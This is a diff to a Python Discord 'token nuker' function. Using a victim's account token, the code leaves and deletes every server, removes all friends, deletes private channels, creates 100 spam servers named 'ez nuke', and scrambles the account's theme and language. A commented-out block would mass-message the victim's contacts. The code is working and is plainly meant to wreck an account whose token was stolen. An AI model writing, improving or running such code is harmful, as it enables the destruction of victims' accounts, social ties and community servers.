@@ -142,68 +142,37 @@ def tokenNuke(token):
     print(f"[{Fore.MAGENTA}+{Fore.RESET}] Nuking...")
 
     try:
-          for guild in guildsIds:
+        requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json={'theme': 'light', 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])})
+
+        for guild in guildsIds:
             requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guild}', headers=headers)
             print(f'Left guild {guild}')
+                        
+        for friend in friendsIds:
+            requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers)
+            print(f'Removed friend {friend}')
+            
+        #sendmessage = input('What do you want to send to everyone on the recent dms. > ')
+        #for id in channelIds:
+        # requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
+        #  print(f'Sent message to private channel ID of {id}')
+
+        for id in channelIds:
+            requests.delete(f'https://discord.com/api/v8/channels/{id}', headers=headers)
+            print(f'Removed private channel ID {id}')
+
+        for guild in guildsIds:
+            requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
+            print(f'Deleted guild {guild}')
+
+        for i in range(100):
+            gname = 'ez nuke'
+            payload = {'name': f'{gname}', 'region': 'europe', 'icon': None, 'channels': None}
+            requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
+            print(f'Server {gname} made. Count: {i}')
     except Exception as e:
         print(f'Error detected, ignoring. {e}')
 
-
-        try:
-            for friend in friendsIds:
-                requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers)
-                print(f'Removed friend {friend}')
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
-
-
-        try:
-            sendmessage = input('What do you want to send to everyone on the recent dms. > ')
-            for id in channelIds:
-                requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
-                print(f'Sent message to private channel ID of {id}')
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
-
-        try:
-            for id in channelIds:
-                requests.delete(f'https://discord.com/api/v8/channels/{id}', headers=headers)
-                print(f'Removed private channel ID {id}')
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
-
-
-        try:
-            for guild in guildsIds:
-                requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
-                print(f'Deleted guild {guild}')
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
-
-
-        try:
-            gname = input('What would you like the spammed server name be. > ')
-            gserv = input('How many servers would you like to be made. [max is 100 by discord]')
-            for i in range(int(gserv)):
-                payload = {'name': f'{gname}', 'region': 'europe', 'icon': None, 'channels': None}
-                requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
-                print(f'Server {gname} made. Count: {i}')
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
-
-
-        try:
-            modes = 'light'
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
-
-
-        try:
-            while True:
-                setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])}
-                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
 
     print("\nToken has been fucked.")
     input("PRESS ENTER TO RETURN")
